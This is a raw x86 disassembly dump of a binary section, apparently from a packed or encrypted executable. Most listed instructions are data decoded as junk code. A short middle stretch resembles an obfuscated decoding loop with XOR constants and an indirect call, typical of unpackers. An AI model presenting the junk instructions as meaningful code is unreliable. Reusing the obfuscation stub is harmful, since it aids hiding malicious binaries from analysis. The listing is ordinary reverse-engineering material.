  4107c4:	sub    BYTE PTR ds:0x2a0024ef,cl
  4107ca:	ror    ebx,1
  4107cc:	or     eax,0x5a15f72a
  4107d1:	ds push ecx
  4107d3:	cmp    bl,bh
  4107d5:	mov    BYTE PTR [ebx-0x78be933c],ah
  4107db:	mov    dh,0xd8
  4107dd:	icebp  
  4107de:	fs stos DWORD PTR es:[edi],eax
  4107e0:	les    edx,FWORD PTR [eax+0x64]
  4107e3:	cld    
  4107e4:	jle    0x410785
  4107e6:	je     0x4107b3
  4107e8:	push   edx
  4107e9:	mov    edx,0x195625ab
  4107ee:	xchg   esi,eax
  4107ef:	push   eax
  4107f0:	sub    bl,bl
  4107f2:	lock repnz sub bl,BYTE PTR [edx-0x40]
  4107f7:	fmul   QWORD PTR [edi+0x18ff30d6]
  4107fd:	repz and cl,cl
  410800:	jmp    0x82c:0x47a7d754
  410807:	pop    edx
  410808:	pop    ss
  410809:	mov    ecx,0xf1f8a2b8
  41080e:	mov    ds:0x5f9a1a90,eax
  410813:	pop    ds
  410814:	jmp    0x4107eb
  410816:	icebp  
  410817:	mov    al,0x86
  410819:	repnz xor BYTE PTR [ebx],cl
  41081c:	pop    ebp
  41081d:	popf   
  41081e:	mov    ecx,esp
  410820:	in     eax,dx
  410821:	push   0xffffffa3
  410823:	loope  0x410841
  410825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410826:	cmp    al,0x7b
  410828:	test   al,0xa7
  41082a:	push   esi
  41082b:	out    dx,al
  41082c:	(bad)  
  41082d:	jg     0x4107cc
  41082f:	push   0x1ce54371
  410834:	xchg   edx,eax
  410835:	add    dh,dl
  410837:	loopne 0x41087f
  410839:	and    al,0x4d
  41083b:	ror    DWORD PTR [esi+edi*8],0x35
  41083f:	ret    0xa030
  410842:	pop    eax
  410843:	into   
  410844:	inc    ebp
  410845:	sbb    DWORD PTR [edx-0x13daf478],edi
  41084b:	cmp    eax,DWORD PTR [ecx+0x40cac8b0]
  410851:	cs imul ecx,ebx,0xfffffffe
  410855:	pop    ebx
  410856:	out    dx,al
  410857:	pop    ebx
  410858:	rol    DWORD PTR [ecx-0x7d3b1240],1
  41085e:	cmp    ah,BYTE PTR [ecx+0x30b2f7cc]
  410864:	dec    ebx
  410865:	(bad)  [esi+0x29]
  410868:	mov    ah,0xb1
  41086a:	retf   0xe2b1
  41086d:	pop    esi
  41086e:	(bad)  
  41086f:	and    eax,0x837a119f
  410874:	out    0xa4,eax
  410876:	icebp  
  410877:	push   0x7fb2a6e
  41087c:	scas   al,BYTE PTR es:[edi]
  41087d:	add    al,0x23
  41087f:	adc    ebx,DWORD PTR [ecx+edx*8-0x4]
  410883:	xor    eax,0x7773301f
  410888:	xchg   esi,eax
  410889:	mov    WORD PTR es:0xee50735,cs
  410890:	jns    0x410851
  410892:	mov    dh,BYTE PTR [esp+edx*2]
  410895:	adc    esi,DWORD PTR [ecx-0x69f6f627]
  41089b:	cmp    al,0x56
  41089d:	pop    esp
  41089e:	rcpps  xmm0,XMMWORD PTR [ebx-0x184195ab]
  4108a5:	out    0xe3,al
  4108a7:	dec    esi
  4108a8:	add    al,0x1c
  4108aa:	push   esi
  4108ab:	xchg   BYTE PTR [ebx+0x47c47a62],bl
  4108b1:	sbb    bl,BYTE PTR [esi+0x51ca64b7]
  4108b7:	pop    esi
  4108b8:	cmp    al,0xb2
  4108ba:	fucom  st(7)
  4108bc:	adc    BYTE PTR [esi+eiz*4+0x47d9738e],bl
  4108c3:	pop    esi
  4108c4:	jbe    0x410848
  4108c6:	add    ebp,ebx
  4108c8:	mov    esp,DWORD PTR [esi+0x61]
  4108cb:	xor    al,0xdb
  4108cd:	or     al,BYTE PTR ds:[ebp-0x2c92a0de]
  4108d4:	fldcw  WORD PTR [ecx+0x289fb5d5]
  4108da:	add    ecx,edx
  4108dc:	idiv   eax
  4108de:	mov    esi,DWORD PTR [esi-0x4cfa8925]
  4108e4:	cmp    ch,0xd7
  4108e7:	das    
  4108e8:	scas   eax,DWORD PTR es:[edi]
  4108e9:	xchg   ebx,eax
  4108ea:	add    al,0xea
  4108ec:	mov    ecx,0xf167be63
  4108f1:	pop    ss
  4108f2:	sub    al,0x58
  4108f4:	jp     0x4108aa
  4108f6:	xchg   edi,eax
  4108f7:	pmaxsw mm3,QWORD PTR ds:0xdb255785
  4108fe:	les    ebx,FWORD PTR [ebx+0x24]
  410901:	push   ecx
  410902:	imul   edi,DWORD PTR ds:0x419a2553,0xffffff99
  410909:	push   esp
  41090a:	jg     0x41090b
  41090c:	jno    0x6eed2e4
  410912:	lea    eax,[esi]
  410914:	xchg   ebx,eax
  410915:	and    eax,0xe050f5ae
  41091a:	loop   0x410977
  41091c:	mov    ss,WORD PTR [ecx+0x5c78b3c9]
  410922:	fsub   st,st(0)
  410924:	arpl   WORD PTR ds:0x1adbac0c,cx
  41092a:	push   ebx
  41092b:	rcr    DWORD PTR [ecx-0x23d8abfd],1
  410931:	ror    BYTE PTR [ebx-0x67416f0],cl
  410937:	push   esi
  410938:	mov    BYTE PTR [esi],ah
  41093a:	dec    edx
  41093b:	call   0xf48d3792
  410940:	sbb    al,0xff
  410942:	push   es
  410943:	push   0x34
  410945:	ret    0x1266
  410948:	ret    0x6098
  41094b:	adc    al,0xe
  41094d:	in     al,dx
  41094e:	not    DWORD PTR [edi+0x7e]
  410951:	loope  0x41099f
  410953:	das    
  410954:	mov    es,WORD PTR [edx]
  410956:	or     ch,ch
  410958:	sbb    eax,DWORD PTR [ebx]
  41095a:	sar    DWORD PTR [ecx],0x46
  41095d:	push   esp
  41095e:	pop    esi
  41095f:	je     0x41096d
  410965:	mov    eax,DWORD PTR [ebp+0x8]
  410968:	jmp    0x410986
  41096d:	mov    eax,DWORD PTR [ebp-0x4]
  410970:	xor    eax,edx
  410972:	add    eax,ecx
  410974:	jmp    0x410986
  410979:	mov    eax,DWORD PTR [ebp-0x4]
  41097c:	xor    eax,0x7510851
  410981:	add    eax,0x327299
  410986:	leave  
  410987:	ret    0x4
  41098a:	push   ebp
  41098b:	mov    ebp,esp
  41098d:	push   ecx
  41098e:	mov    ecx,DWORD PTR [ebp+0x8]
  410991:	and    DWORD PTR ds:0x43466f,0x0
  41099b:	mov    eax,ds:0x43466f
  4109a0:	inc    eax
  4109a1:	mov    ds:0x43466f,eax
  4109a6:	cmp    DWORD PTR ds:0x43466f,0x9
  4109ad:	jne    0x4109c9
  4109b3:	push   0x61e9
  4109b8:	push   DWORD PTR [ebp-0x28]
  4109bb:	push   DWORD PTR [ebp-0x28]
  4109be:	push   0x6f4e
  4109c3:	call   DWORD PTR ds:0x4132a8
  4109c9:	cmp    DWORD PTR ds:0x43466f,0x8
  4109d0:	jne    0x4109e1
  4109d6:	mov    eax,ds:0x43466f
  4109db:	inc    eax
  4109dc:	mov    ds:0x43466f,eax
  4109e1:	cmp    DWORD PTR ds:0x43466f,0x17
  4109e8:	jb     0x41099b
  4109ee:	movzx  eax,BYTE PTR ds:0x43474f
  4109f5:	adc    DWORD PTR ds:0x434663,eax
  4109fb:	mov    eax,0x7510851
  410a00:	and    DWORD PTR ds:0x43473b,0x46b5
  410a0a:	xor    ecx,eax
  410a0c:	add    ecx,0x327299
  410a12:	mov    DWORD PTR ds:0x434687,0x530c
  410a1c:	jmp    0x410cd8
  410a21:	cmp    eax,0x7d22e5f8
  410a26:	arpl   bp,di
  410a28:	mov    DWORD PTR [ebx+0x2d],esp
  410a2b:	arpl   di,bp
  410a2d:	(bad)  
  410a2e:	loope  0x410a2a
  410a30:	data16 stos BYTE PTR es:[edi],al
  410a32:	inc    edx
  410a33:	jle    0x410ab3
  410a35:	popf   
  410a36:	js     0x410ab6
  410a38:	jle    0x410aae
  410a3a:	fs mov dl,0x14
  410a3d:	mov    esp,DWORD PTR [eax-0x15]
  410a40:	mov    ?,edx
  410a42:	stos   DWORD PTR es:[edi],eax
  410a43:	push   0x2b
  410a45:	ins    BYTE PTR es:[edi],dx
  410a46:	inc    edi
  410a47:	retf   0xc73d
  410a4a:	sbb    al,0xfe
  410a4c:	pop    edx
  410a4d:	aad    0xfc
  410a4f:	scas   eax,DWORD PTR es:[edi]
  410a50:	jge    0x410a84
  410a52:	jle    0x410a66
  410a54:	aad    0x60
  410a56:	mov    DWORD PTR [edi+0x48d8bdd6],ecx
  410a5c:	and    cl,bl
  410a5e:	jno    0x4109f7
  410a60:	retf   
  410a61:	jmp    0x410a27
  410a63:	add    DWORD PTR [eax+esi*4+0x72c4620f],eax
  410a6a:	sbb    al,0x3a
  410a6c:	in     eax,dx
  410a6d:	jge    0x410a7f
  410a6f:	push   esp
  410a70:	adc    al,0x1
  410a72:	pop    ebp
  410a73:	add    BYTE PTR [eax+eax*2],bh
  410a76:	ffreep st(2)
  410a78:	sbb    ah,BYTE PTR [ebp+edi*8-0x36faed5]
  410a7f:	leave  
  410a80:	sbb    al,0x29
  410a82:	or     eax,0x70586a08
  410a87:	pop    ebx
  410a88:	loop   0x410a0f
  410a8a:	jbe    0x410a40
  410a8c:	js     0x410a92
  410a8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a8f:	mov    ch,0xe5
  410a91:	adc    DWORD PTR [edx+0x52],esp
  410a94:	pop    ebx
  410a95:	mov    eax,ds:0xbe8f9aaa
  410a9a:	scas   al,BYTE PTR es:[edi]
  410a9b:	push   edi
  410a9c:	xor    DWORD PTR [eax-0x7f],eax
  410a9f:	js     0x410ab5
  410aa1:	push   esi
  410aa2:	leave  
  410aa3:	push   ds
  410aa4:	push   ss
  410aa5:	jg     0x410afd
  410aa7:	push   ebp
  410aa8:	push   0xffffff92
  410aaa:	fwait
  410aab:	add    al,0x5d
  410aad:	inc    esp
  410aae:	jmp    0x214b9280
  410ab3:	hlt    
  410ab4:	mov    dh,0xdd
  410ab6:	mov    ds:0x49ddf7e6,al
  410abb:	mov    dh,0x61
  410abd:	sti    
  410abe:	push   0x6f
  410ac0:	sbb    edi,0xffffffca
  410ac3:	jmp    0xbd127c96
  410ac8:	cld    
  410ac9:	es popf 
  410acb:	xor    ebx,DWORD PTR [ebx+eax*1]
  410ace:	out    dx,eax
  410acf:	cmp    eax,eax
  410ad1:	xor    al,0x8d
  410ad3:	not    DWORD PTR [esi]
  410ad5:	and    eax,0x85a9a4ef
  410ada:	or     eax,0x54e1af6e
  410adf:	arpl   WORD PTR [ecx-0x3],cx
  410ae2:	int3   
  410ae3:	(bad)  
  410ae4:	mov    edi,0xf86cb7ff
  410ae9:	jnp    0x410aaa
  410aeb:	scas   eax,DWORD PTR es:[edi]
  410aec:	mov    bh,0xc0
  410aee:	fnsetpm(287 only) 
  410af0:	adc    eax,0x16542199
  410af5:	sub    ebx,DWORD PTR [ecx+0x18]
  410af8:	call   0xda3870c5
  410afd:	inc    ebp
  410afe:	bound  eax,QWORD PTR [ebp-0x530ee697]
  410b04:	fld    DWORD PTR [ecx]
  410b06:	mov    ebx,0xfa06d477
  410b0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b0c:	(bad)  
  410b0d:	push   0xffffffc3
  410b0f:	test   BYTE PTR [ecx+0x922f0f1],0x5b
  410b16:	pop    esp
  410b17:	mov    DWORD PTR [ebp+ebp*8+0x5f],ecx
  410b1b:	push   edx
  410b1c:	out    0xff,eax
  410b1e:	push   ebx
  410b1f:	leave  
  410b20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b21:	neg    BYTE PTR es:[edx+0x4d]
  410b25:	inc    edi
  410b26:	in     eax,dx
  410b27:	or     DWORD PTR [ebp+0x17],0x9bced2b5
  410b2e:	xchg   esi,eax
  410b2f:	clc    
  410b30:	or     al,0x60
  410b32:	repnz nop
  410b34:	or     eax,0x8360ee9a
  410b39:	cs aaa 
  410b3b:	aad    0xff
  410b3d:	and    al,BYTE PTR [edx+0x12]
  410b40:	inc    edx
  410b41:	or     edx,ecx
  410b43:	inc    esp
  410b44:	and    ecx,DWORD PTR [edi-0x8b0a1ad]
  410b4a:	popf   
  410b4b:	es xchg ebx,eax
  410b4d:	rcl    DWORD PTR [eax],cl
  410b4f:	ffreep st(1)
  410b51:	(bad)  
  410b52:	cmp    DWORD PTR [eax+0x53ddfe63],ecx
  410b58:	rol    BYTE PTR [ebx-0x51a52a79],0x30
  410b5f:	mov    ebx,ecx
  410b61:	push   edx
  410b62:	pop    edi
  410b63:	jp     0x410ae5
  410b65:	xchg   ecx,eax
  410b66:	pusha  
  410b67:	sar    bh,0x51
  410b6a:	je     0x410b09
  410b6c:	test   eax,0xb898e886
  410b71:	aad    0x1d
  410b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b74:	cs iret 
  410b76:	dec    eax
  410b77:	mov    al,0x88
  410b79:	clc    
  410b7a:	xor    DWORD PTR cs:[esi-0x7f],ebx
  410b7e:	sub    DWORD PTR [ebp+0x56],edx
  410b81:	mov    dl,0xb
  410b83:	das    
  410b84:	daa    
  410b85:	mov    bh,0x3e
  410b87:	push   ecx
  410b88:	xor    al,0x8e
  410b8a:	jbe    0x410b95
  410b8c:	(bad)
  410b8f:	jb     0x410ba1
  410b91:	stc    
  410b92:	xlat   BYTE PTR ds:[ebx]
  410b93:	pop    edx
  410b94:	xchg   BYTE PTR [ecx-0x43b82112],ah
  410b9a:	or     al,0x9b
  410b9c:	xchg   edi,eax
  410b9d:	and    eax,0x36a41cfe
  410ba2:	and    DWORD PTR [ecx-0xe],0x52
  410ba6:	push   ss
  410ba7:	hlt    
  410ba8:	cmp    ah,BYTE PTR [eax+esi*4-0x34]
  410bac:	call   0x44053bae
  410bb1:	outs   dx,DWORD PTR ds:[esi]
  410bb2:	aad    0x9
  410bb4:	xor    cl,BYTE PTR ds:0x39e78e1b
  410bba:	add    DWORD PTR [ecx-0x5],ebx
  410bbd:	loopne 0x410bba
  410bbf:	out    dx,eax
  410bc0:	jne    0x410c36
  410bc2:	inc    esp
  410bc3:	and    al,0x5
  410bc5:	pop    ebp
  410bc6:	xchg   DWORD PTR [ecx],esi
  410bc8:	dec    esp
  410bc9:	add    BYTE PTR [ecx+0x17],cl
  410bcc:	jns    0x410b87
  410bce:	inc    eax
  410bcf:	inc    ebx
  410bd0:	cmp    DWORD PTR [ecx],0x1c
  410bd3:	not    BYTE PTR [esi]
  410bd5:	ret    0xb33e
  410bd8:	sbb    eax,0x7abeb685
  410bdd:	rcr    eax,cl
  410bdf:	adc    DWORD PTR [esi-0x6e],eax
  410be2:	test   BYTE PTR [ecx],bh
  410be4:	and    al,dh
  410be6:	arpl   sp,dx
  410be8:	cmp    bh,BYTE PTR [edx-0x31]
  410beb:	and    BYTE PTR [ecx+0x57],bl
  410bee:	div    BYTE PTR [esp+eiz*8+0x63]
  410bf2:	add    dl,BYTE PTR [edi]
  410bf4:	inc    esi
  410bf5:	adc    bl,BYTE PTR [edx-0x4f]
  410bf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bf9:	rol    esi,1
  410bfb:	push   eax
  410bfc:	enter  0x7912,0x40
  410c00:	clc    
  410c01:	(bad)  
  410c02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c03:	loope  0x410c74
  410c05:	inc    ebp
  410c06:	fimul  WORD PTR [edi-0x48011020]
  410c0c:	(bad)  
  410c0d:	push   edi
  410c0e:	out    0x6f,eax
  410c10:	inc    eax
  410c11:	aam    0x14
  410c13:	cmp    eax,0x5b717d1d
  410c18:	aam    0x4d
  410c1a:	aaa    
  410c1b:	ins    DWORD PTR es:[edi],dx
  410c1c:	test   BYTE PTR [ecx],ch
  410c1e:	sub    BYTE PTR [edi],0xe9
  410c21:	add    DWORD PTR [eax],ebp
  410c23:	je     0x410bc3
  410c25:	sub    eax,0x685683bf
  410c2a:	out    0xc7,al
  410c2c:	mov    dl,BYTE PTR [esi]
  410c2e:	out    dx,eax
  410c2f:	and    eax,0xc87dc280
  410c34:	mov    eax,ds:0xc2ef95a7
  410c39:	cdq    
  410c3a:	and    edx,DWORD PTR [ebp+0x34]
  410c3d:	jl     0x410bc5
  410c3f:	add    al,0xdf
  410c41:	sub    al,BYTE PTR [esi+0x74]
  410c44:	mov    WORD PTR [esi+0x4b985c9d],cs
  410c4a:	xchg   edi,eax
  410c4b:	push   0xce9960a8
  410c50:	push   0x9e2998f9
  410c55:	out    0x22,al
  410c57:	sub    DWORD PTR [ebx],ebx
  410c59:	inc    edx
  410c5a:	ret    
  410c5b:	mov    ebx,DWORD PTR [edi-0x6b8fd5dc]
  410c61:	sti    
  410c62:	jo     0x410c90
  410c64:	add    bh,dl
  410c66:	leave  
  410c67:	xor    BYTE PTR [esi+0x5b],0x10
  410c6b:	repnz add DWORD PTR [ebp-0x55b8af72],0x49
  410c73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c74:	sbb    eax,0x78bd6d9c
  410c79:	jb     0x410c9a
  410c7b:	sub    BYTE PTR [edx+eiz*8],bh
  410c7e:	push   edi
  410c7f:	sahf   
  410c80:	fidiv  WORD PTR [esi+edi*8+0xb]
  410c84:	(bad)  
  410c85:	repz dec eax
  410c87:	jg     0x410d03
  410c89:	aas    
  410c8a:	jae    0x410d01
  410c8c:	outs   dx,BYTE PTR ds:[esi]
  410c8d:	into   
  410c8e:	stos   DWORD PTR es:[edi],eax
  410c8f:	(bad)  
  410c91:	sub    DWORD PTR [ebx],0xffffff81
  410c94:	cli    
  410c95:	out    0xc1,al
  410c97:	push   ds
  410c98:	mov    ds:0x98b991f9,al
  410c9d:	mov    dl,0x10
  410c9f:	mov    esi,edx
  410ca1:	jbe    0x410c27
  410ca3:	pop    esi
  410ca4:	call   0x26fdb8ca
  410ca9:	fwait
  410caa:	dec    esi
  410cab:	mov    edi,0xd1ae3bb6
  410cb0:	xchg   edx,eax
  410cb1:	leave  
  410cb2:	pop    edi
  410cb3:	xor    ebp,esi
  410cb5:	ret    0x2fe5
  410cb8:	loopne 0x410c57
  410cba:	adc    BYTE PTR ds:0x110dd1ba,0x9d
  410cc1:	mov    esi,0x551c5614
  410cc6:	add    dh,ch
  410cc8:	push   cs
  410cc9:	pop    edx
  410cca:	mov    al,0x91
  410ccc:	loopne 0x410cf8
  410cce:	push   edi
  410ccf:	mov    eax,0xf18b6cbe
  410cd4:	add    al,BYTE PTR [ebp-0x38]
  410cd7:	ror    DWORD PTR [ecx+0xd8b104d],0x47
  410cde:	inc    edi
  410cdf:	inc    ebx
  410ce0:	add    bh,al
  410ce2:	inc    ebp
  410ce3:	or     BYTE PTR [edx-0x38f0cb32],bh
  410ce9:	inc    ebp
  410cea:	cld    
  410ceb:	cmp    eax,0x8bf89c85
  410cf0:	or     eax,0x434663
  410cf5:	mov    ecx,0xf89c8539
  410cfa:	push   esi
  410cfb:	mov    DWORD PTR [ebp+0x10],0x70019f8
  410d02:	mov    DWORD PTR ds:0x43478b,edx
  410d08:	mov    esi,DWORD PTR [ebp-0x4]
  410d0b:	cmp    ecx,esi
  410d0d:	mov    DWORD PTR ds:0x434793,0x165f
  410d17:	je     0x411018
  410d1d:	mov    esi,DWORD PTR [ebp+0xc]
  410d20:	xor    ecx,eax
  410d22:	sub    DWORD PTR ds:0x434747,0x434703
  410d2c:	xor    esi,eax
  410d2e:	xor    DWORD PTR ds:0x434787,0x6bfa
  410d38:	lea    ecx,[esi+ecx*1+0x327299]
  410d3f:	xor    ecx,eax
  410d41:	cmp    ecx,0xf89c8526
  410d47:	jne    0x410cfb
  410d4d:	mov    DWORD PTR ds:0x43470f,0x7d20
  410d57:	jmp    0x411302
  410d5c:	jmp    0x411018
  410d61:	inc    ebp
  410d62:	lods   al,BYTE PTR ds:[esi]
  410d63:	xchg   DWORD PTR [ebx],ebx
  410d65:	addr16 and eax,0xe5906c6d
  410d6b:	mov    DWORD PTR [ebx+0x6cacf410],esi
  410d71:	leave  
  410d72:	dec    ebp
  410d73:	jle    0x410df3
  410d75:	popf   
  410d76:	js     0x410df6
  410d78:	jle    0x410d3e
  410d7a:	sub    BYTE PTR [eax],ah
  410d7c:	loop   0x410da4
  410d7e:	push   esi
  410d7f:	imul   edx,DWORD PTR [ebx+edx*1-0x7576d0a3],0xcbf81dbd
  410d8a:	mov    dl,0x5a
  410d8c:	and    DWORD PTR [eax+0x41662fb2],esi
  410d92:	dec    eax
  410d93:	shl    BYTE PTR [edi],0xdd
  410d96:	ins    BYTE PTR es:[edi],dx
  410d97:	stos   DWORD PTR es:[edi],eax
  410d98:	test   eax,0x1e9c6ffa
  410d9d:	xchg   ebp,eax
  410d9e:	int3   
  410d9f:	ret    0x4412
  410da2:	xchg   DWORD PTR [edx+0x61fc220],ebx
  410da8:	push   es
  410da9:	mov    ebx,0x12509f78
  410dae:	mov    ah,0x8d
  410db0:	inc    ebp
  410db1:	sbb    BYTE PTR [edx-0x658c6cc],dh
  410db7:	je     0x410e09
  410db9:	mov    edx,0x48559fa3
  410dbe:	js     0x410d9c
  410dc0:	push   ds
  410dc1:	ret    
  410dc2:	std    
  410dc3:	pop    ds
  410dc4:	pusha  
  410dc5:	push   es
  410dc6:	jge    0x410e34
  410dc8:	jl     0x410e09
  410dca:	pop    eax
  410dcb:	in     al,0xf
  410dcd:	test   BYTE PTR [esi+esi*8-0x65],bl
  410dd1:	daa    
  410dd2:	inc    esp
  410dd3:	fmul   st,st(0)
  410dd5:	push   es
  410dd6:	ds mov bh,0xe2
  410dd9:	fisubr DWORD PTR [edx+0x7e8f5af9]
  410ddf:	xchg   esp,eax
  410de0:	sar    DWORD PTR ss:[esi],cl
  410de3:	fcomp  DWORD PTR [esi-0x1f71f51e]
  410de9:	es push es
  410deb:	inc    esi
  410dec:	sbb    al,0x63
  410dee:	sub    cl,BYTE PTR [ebp-0x54]
  410df1:	aaa    
  410df2:	mov    ebx,0xd7fdbeae
  410df7:	inc    edx
  410df8:	inc    ecx
  410df9:	hlt    
  410dfa:	inc    ebx
  410dfb:	cmp    bh,BYTE PTR [ebx]
  410dfd:	(bad)  
  410dfe:	and    ebx,eax
  410e00:	outs   dx,DWORD PTR ds:[esi]
  410e01:	cs xor al,0x8d
  410e04:	pop    esi
  410e05:	sbb    DWORD PTR [esi],eax
  410e07:	push   DWORD PTR [edi-0x52]
  410e0a:	mov    DWORD PTR [ecx-0x61],edi
  410e0d:	mov    esi,0xd3345b02
  410e12:	and    esp,0x17
  410e15:	xor    al,0x19
  410e17:	stos   DWORD PTR es:[edi],eax
  410e18:	add    DWORD PTR [edi],0xcb505eb7
  410e1e:	add    al,0xd8
  410e20:	in     al,dx
  410e21:	adc    eax,0x4cc21ca5
  410e26:	clc    
  410e27:	in     al,dx
  410e28:	xchg   ecx,eax
  410e29:	mov    ah,0x17
  410e2b:	push   eax
  410e2c:	aam    0x4a
  410e2e:	(bad)  
  410e2f:	jl     0x410e38
  410e31:	rcr    DWORD PTR [eax-0xd],0x77
  410e35:	mov    ebx,0xba202b22
  410e3a:	jnp    0x410e2e
  410e3c:	sub    eax,0x742fe13c
  410e41:	jbe    0x410dcd
  410e43:	jge    0xa09269e3
  410e49:	(bad)  
  410e4a:	rcr    DWORD PTR [ebx+0x5f],cl
  410e4d:	cdq    
  410e4e:	dec    ecx
  410e4f:	adc    ebp,DWORD PTR [eax-0x75b0cae4]
  410e55:	sub    cl,bh
  410e57:	add    al,bh
  410e59:	adc    BYTE PTR [ecx+0x4f6a4d0c],cl
  410e5f:	stos   BYTE PTR es:[edi],al
  410e60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e61:	push   eax
  410e62:	adc    dl,dl
  410e64:	ss stc 
  410e66:	(bad)  
  410e67:	out    0x4b,eax
  410e69:	pop    esi
  410e6a:	outs   dx,BYTE PTR ds:[esi]
  410e6b:	xchg   esi,eax
  410e6c:	jb     0x410e52
  410e6e:	outs   dx,DWORD PTR ds:[esi]
  410e6f:	mov    BYTE PTR [edi-0x5a],dl
  410e72:	lods   al,BYTE PTR ds:[esi]
  410e73:	mov    ds:0x30ac4bb1,eax
  410e78:	jnp    0x410eac
  410e7a:	aas    
  410e7b:	xlat   BYTE PTR ds:[ebx]
  410e7c:	enter  0xee11,0xb3
  410e80:	fsub   QWORD PTR [ebx+0x44]
  410e83:	push   ebx
  410e84:	push   ecx
  410e85:	xchg   edi,eax
  410e86:	mov    ds:0xea4d2730,al
  410e8b:	xchg   edi,edi
  410e8d:	repnz or ah,BYTE PTR [ebx]
  410e90:	push   esp
  410e91:	sub    eax,0xe4edcec4
  410e96:	xlat   BYTE PTR ds:[ebx]
  410e97:	cmp    BYTE PTR [bx+0x68],cl
  410e9b:	adc    BYTE PTR [esi+esi*8+0x24401074],ch
  410ea2:	mov    ah,0xfd
  410ea4:	rcr    BYTE PTR [ebx+0xa],1
  410ea7:	js     0x410eba
  410ea9:	pop    ds
  410eaa:	inc    edx
  410eab:	addr16 mov edi,0x85d5fb46
  410eb1:	push   eax
  410eb2:	(bad)  
  410eb3:	sti    
  410eb4:	mov    ds:0xf702ab8b,al
  410eb9:	inc    ecx
  410eba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ebb:	adc    ecx,ebp
  410ebd:	in     al,0x74
  410ebf:	adc    BYTE PTR [ecx-0x26],ch
  410ec2:	aaa    
  410ec3:	jmp    0x26af:0x4728c818
  410eca:	cwde   
  410ecb:	mov    BYTE PTR [ecx+0x49ba61b7],ah
  410ed1:	jp     0x410e9b
  410ed3:	xchg   ecx,eax
  410ed4:	and    ecx,DWORD PTR [ebp+0x51]
  410ed7:	jae    0x410efd
  410ed9:	dec    eax
  410eda:	jo     0x410ea8
  410edc:	xor    esi,DWORD PTR [edi]
  410ede:	jge    0x410f02
  410ee0:	xor    DWORD PTR [ecx],0xffffff99
  410ee3:	and    DWORD PTR [ebx],ecx
  410ee5:	dec    edx
  410ee6:	mov    eax,ds:0x453d79
  410eeb:	push   ecx
  410eec:	xlat   BYTE PTR ds:[ebx]
  410eed:	test   BYTE PTR [esp+ebp*1+0x2534b217],0x13
  410ef5:	cli    
  410ef6:	inc    edi
  410ef7:	add    ecx,DWORD PTR ds:0x78127ae2
  410efd:	mov    ds:0xa70221b,eax
  410f02:	inc    edi
  410f03:	int    0x61
  410f05:	xchg   edi,eax
  410f06:	dec    ebx
  410f07:	test   al,0xd6
  410f09:	or     eax,0x221bcc20
  410f0e:	lds    esp,FWORD PTR [ecx]
  410f10:	pop    edx
  410f11:	out    0x59,al
  410f13:	test   DWORD PTR ds:0xcfd39ca3,eax
  410f19:	sbb    dl,bh
  410f1b:	repnz mov ebp,0x72bc30b9
  410f21:	fist   DWORD PTR [esi+ebx*1-0x15af2b85]
  410f28:	xor    al,0x9f
  410f2a:	jae    0x410f16
  410f2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f2d:	xor    ecx,DWORD PTR [eax+0x1a728048]
  410f33:	dec    ebx
  410f34:	lods   eax,DWORD PTR ds:[si]
  410f36:	xor    al,cl
  410f38:	and    al,0x4b
  410f3a:	je     0x410ed7
  410f3c:	imul   DWORD PTR [ecx-0xdca5871]
  410f42:	nop
  410f43:	push   cs
  410f44:	add    cl,BYTE PTR [ebx-0x4687b806]
  410f4a:	mov    cs:0x8453e84a,al
  410f50:	repz fidivr DWORD PTR [edi+0x67]
  410f54:	cmp    ch,BYTE PTR [esi+0x55]
  410f57:	popa   
  410f58:	gs xchg ebp,eax
  410f5a:	dec    edi
  410f5b:	rol    BYTE PTR [esi-0x1fbf4138],cl
  410f61:	ret    0x83ed
  410f64:	mov    esp,0xf910d9dc
  410f69:	dec    ebp
  410f6a:	call   0x8e3d:0x485ce8e9
  410f71:	in     al,dx
  410f72:	test   al,cl
  410f74:	(bad)  
  410f75:	in     al,0x4
  410f77:	sub    eax,0x14aecef6
  410f7c:	stos   DWORD PTR es:[edi],eax
  410f7d:	xor    dl,BYTE PTR [ebp+0x50245040]
  410f83:	push   0x6b
  410f85:	push   ebx
  410f86:	xor    eax,0xc924545e
  410f8b:	loope  0x410f9c
  410f8d:	mov    ah,0x70
  410f8f:	mov    esp,0x7c517b18
  410f94:	mov    bh,0xbc
  410f96:	push   ebx
  410f97:	cwde   
  410f98:	fld    QWORD PTR [ebx+0x41d53887]
  410f9e:	sub    ebx,ebx
  410fa0:	iret   
  410fa1:	adc    edx,ebx
  410fa3:	sub    bl,dh
  410fa5:	xor    eax,0x44c4988c
  410faa:	enter  0xb4cc,0x5e
  410fae:	(bad)  
  410faf:	nop
  410fb0:	jnp    0x411012
  410fb2:	jne    0x410fb6
  410fb4:	stos   DWORD PTR es:[edi],eax
  410fb5:	hlt    
  410fb6:	not    BYTE PTR [esi]
  410fb8:	jno    0x410f66
  410fba:	dec    edi
  410fbb:	and    eax,0xb2b35549
  410fc0:	xchg   DWORD PTR ds:0x71b82795,ebp
  410fc6:	fdivr  QWORD PTR [esi-0x66]
  410fc9:	cmp    bl,bl
  410fcb:	pop    esi
  410fcc:	(bad)  
  410fcd:	cdq    
  410fce:	test   eax,0xffc290df
  410fd3:	dec    edx
  410fd4:	mov    esp,0xe307ff9a
  410fd9:	imul   eax,esp,0xf15e4c34
  410fdf:	sub    BYTE PTR [edx-0x25d30d87],ch
  410fe5:	xor    DWORD PTR [edx+ecx*8-0x339814a1],ecx
  410fec:	enter  0xeb8b,0x1b
  410ff0:	popf   
  410ff1:	cdq    
  410ff2:	pop    ebx
  410ff3:	int3   
  410ff4:	cmp    DWORD PTR [ebx+0x5],0x2190485c
  410ffb:	push   ds
  410ffc:	pop    DWORD PTR [ebp-0x16]
  410fff:	scas   al,BYTE PTR es:[edi]
  411000:	or     eax,0x4512c94d
  411005:	jae    0x410fe2
  411007:	mov    esi,0xf017e0d
  41100c:	xor    dh,ch
  41100e:	xchg   ebp,eax
